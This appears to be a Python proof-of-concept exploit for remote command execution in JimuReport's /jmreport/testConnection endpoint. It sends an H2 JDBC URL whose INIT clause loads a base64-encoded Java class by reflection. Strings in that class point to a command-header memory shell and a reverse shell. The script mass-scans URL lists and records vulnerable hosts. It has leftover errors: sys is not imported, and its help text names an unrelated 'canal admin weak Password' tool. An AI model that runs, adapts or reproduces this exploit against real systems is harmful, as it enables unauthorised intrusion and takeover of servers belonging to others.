# -*- coding: utf-8 -*-
import time
import requests
import urllib3
from rich.console import Console
import argparse
import re
import multiprocessing
from multiprocessing.dummy import Pool
import concurrent.futures
import json
import warnings

warnings.filterwarnings("ignore")


def banner():
    test = """

8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
 Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
  Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
   "8aa8"      88           88,d88'      88 88  `8b   88 88             
    `88'       88           8888"88,     88 88   `8b  88 88      88888  
     88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
     88        88           88     "88,  88 88     `8888  Y8a.    .a88  
     88        88           88       Y8b 88 88      `888   `"Y88888P"   

                 888888888888 

                 tag:  this is a 积木报表系统testConnection接口存在远程命令执行漏洞 poc                                       
                             @version: 1.0.0   @author: Y1_K1NG           
"""
    print(test)


def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Connection": "close",
        "Cmd": "whoami",
        "Content-Length": "8902",
        "Content-Type": "application/json"
    }

    url = target + "/jmreport/testConnection"
    data = {
        "id":"1",
        "code":"ABC",
        "dbType":"MySQL",
        "dbDriver":"org.h2.Driver",
        "dbUrl":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\;clz.newInstance()\\;}'\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')",
        "dbName":"383BAb7deFC825E6",
        "dbPassword":"917982",
        "userName":"917982"
    }
    # response = requests.post(url=url, headers=headers, json=data, verify=False, timeout=5)
    # match = re.search(r"200", response.text)
    # print("请求体:", response.request.body)
    # print(response.status_code)
    # if match:
    #     print("1")
    # else:
    #     print("0")

    try:
        response = requests.post(url=url, headers=headers, json=data, verify=False, timeout=5)
        match = re.search(r"200", response.text)
        if response.status_code == 200:
            if match:
                print(f"[+]{target} is valuable")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-]{target} is 数据库连接error")
        else:
            print(f"[-]{target} is not valuable")
    except requests.exceptions.SSLError as e:
        print(f"[*] {target} error: {str(e)}")
    except:
        print(f"[*] {target} error")

def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(?:https?://)?([\w\.]+):?(\d+)?", url)
    if match:
        host, port = match.groups()
        if not port:
            if "https" in url:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None

def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        host, port = extract_host(args.url)
        if host:
            if "https" in args.url:
                url = f"https://{host}:{port}"
            else:
                url = f"http://{host}:{port}"
            poc(url)
        else:
            print(f"Invalid URL: {args.url}")
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                host, port = extract_host(url)
                if host:
                    if "https" in url:
                        url_list.append(f"https://{host}:{port}")
                    else:
                        url_list.append(f"http://{host}:{port}")
                else:
                    print(f"Invalid URL: {url}")

        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
